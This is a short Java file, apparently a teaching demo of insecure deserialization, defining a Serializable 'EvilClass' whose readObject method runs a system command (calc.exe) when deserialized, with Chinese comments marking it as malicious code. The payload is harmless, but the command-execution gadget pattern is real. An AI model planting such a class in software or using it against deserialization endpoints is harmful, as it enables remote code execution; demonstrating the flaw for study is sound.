package com.tongji.auth.token;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class EvilClass implements Serializable {

    // 反序列化时，Java 会自动调用这个方法！
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();

        // ========== 恶意代码：执行系统命令 ==========
        System.out.println("⚠️ 反序列化触发了恶意代码！");
        Runtime.getRuntime().exec("calc.exe"); // Windows 弹出计算器
    }
}
